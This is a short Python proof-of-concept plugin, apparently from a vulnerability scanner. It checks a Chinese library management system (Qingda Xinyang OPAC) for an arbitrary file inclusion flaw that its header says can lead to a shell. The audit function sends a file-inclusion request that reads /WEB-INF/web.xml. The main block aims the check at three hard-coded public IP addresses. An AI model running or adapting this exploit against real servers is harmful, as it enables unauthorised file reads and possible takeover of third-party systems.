#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
'''
Author = wonderkun
Name   = 北京清大新洋图书管理系统任意文件包含漏洞，可getshell
Refer  = http://www.wooyun.org/bugs/wooyun-2015-0125761
Data   = 2015/12/19
'''

def assign(service,arg):
    if service=='xinyang':
        return True,arg

def audit(arg):
    url = arg + "opac/index.jsp?page=/WEB-INF/web.xml"
    code,head,res,errcode,finalurl = curl.curl2(url)
    if code==200 and ("xml" in res) and ("<servlet>"  in res) and ("<servlet-mapping>" in res):
        security_hole("任意文件包含漏洞 " + arg)

if __name__ == '__main__':
    from dummy import *
    audit(assign('xinyang','http://210.46.140.21:8080/')[1])
    audit(assign('xinyang','http://58.133.216.9:8070/')[1])
    audit(assign('xinyang','http://218.24.88.50:8088/')[1])